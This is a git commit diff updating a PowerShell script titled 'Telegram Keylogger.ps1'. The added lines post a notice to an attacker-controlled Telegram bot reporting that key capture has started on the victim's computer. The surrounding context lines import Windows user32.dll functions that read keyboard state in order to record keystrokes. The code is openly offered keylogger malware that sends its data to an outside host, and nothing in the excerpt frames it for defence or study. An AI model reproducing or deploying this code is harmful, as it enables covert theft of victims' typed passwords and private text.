0e47dc4146b5df95440e7cc90fe4a6a191e14670
beigeworm <93350544+beigeworm@users.noreply.github.com>
2023-08-14 10:38:32 +0100

    Update Telegram Keylogger.ps1

--- Telegram and Dropbox Scripts/Telegram Keylogger.ps1
+++ Telegram and Dropbox Scripts/Telegram Keylogger.ps1
@@ -30,6 +30,10 @@ $URL='https://api.telegram.org/bot{0}' -f $Token
 
 
 Function KeyCapture {
+$MessageToSend = New-Object psobject 
+$MessageToSend | Add-Member -MemberType NoteProperty -Name 'chat_id' -Value $ChatID
+$MessageToSend | Add-Member -MemberType NoteProperty -Name 'text' -Value "$env:COMPUTERNAME : KeyCapture Started." -Force
+irm -Method Post -Uri ($URL +'/sendMessage') -Body ($MessageToSend | ConvertTo-Json) -ContentType "application/json"
 $API = '[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] public static extern short GetAsyncKeyState(int virtualKeyCode); [DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int GetKeyboardState(byte[] keystate);[DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int MapVirtualKey(uint uCode, int uMapType);[DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);'
 $API = Add-Type -MemberDefinition $API -Name 'Win32' -Namespace API -PassThru
 $LastKeypressTime = [System.Diagnostics.Stopwatch]::StartNew()
